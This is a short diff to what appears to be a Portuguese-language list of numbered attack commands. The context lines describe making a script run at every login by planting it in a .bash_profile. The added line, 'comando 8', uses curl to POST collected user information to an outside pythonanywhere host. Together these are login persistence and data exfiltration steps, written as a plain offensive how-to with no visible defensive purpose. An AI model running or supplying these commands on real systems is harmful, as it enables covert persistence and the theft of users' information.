@@ -19,3 +19,5 @@
  - comando 7: rodar o script sempre que existir inicio de sessao
  	#raquear sistema criando um bash_profile
 	cat ~/.bash_profile
+ - comando 8: enviando arquivos ou informacoes para o pythonanywhere
+	curl -X POST -F "username=$user" https://teu_user.pythonanywhere.com/register
